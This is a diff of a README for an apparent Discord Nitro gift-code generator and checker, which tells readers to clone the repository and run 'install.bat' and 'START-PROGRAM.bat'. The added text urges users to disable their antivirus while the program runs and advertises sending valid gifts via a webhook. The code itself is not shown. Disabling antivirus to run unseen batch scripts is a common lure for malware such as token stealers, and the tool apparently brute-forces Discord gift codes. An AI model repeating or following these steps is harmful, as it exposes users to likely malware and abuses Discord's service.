@@ -1,4 +1,4 @@
-## 🎁 Quick & Easy Discord Nitro Generator and Checker written in Python. 🎁
+## Discord-Nitro-Generator-Checker
 This is an open-source Discord Nitro Generator written in Python! Please Do Not Copy, unless you Credit!
 ## Features
 + Nitro Code Generation, amount you choice!
@@ -10,17 +10,25 @@ This is an open-source Discord Nitro Generator written in Python! Please Do Not 
 ```
 git clone https://github.com/b4db0y01/Discord-Nitro-Generator-Checker.git
 ```
-**Run** 
+Run 
 ```
 "install.bat"
 ``` 
-**Then run a new file**
-``` 
+Then Run the new file
+```
 "START-PROGRAM.bat"
-``` 
-## Generates and checks about 5 codes per second.
+```
 
+## ⚠ You may need to disable your antivirus as it may suspect "suspicious activity" as it often calls the discord API to check the code (i solve this problem).
+
+and you should be good to go!
+
+You MUST Have The Latest Version of Python installed (recommended). I Am not sure how smoothly or if it would run at all on other versions!
+##
 Any Issues Please Let Me Know!
-#
+##
+- [x] Fast generate!
+- [x] Sends valid gifts via webhook!
+- [x] Beautiful interface!
 ## LICENSE
 [MIT](LICENSE) Que
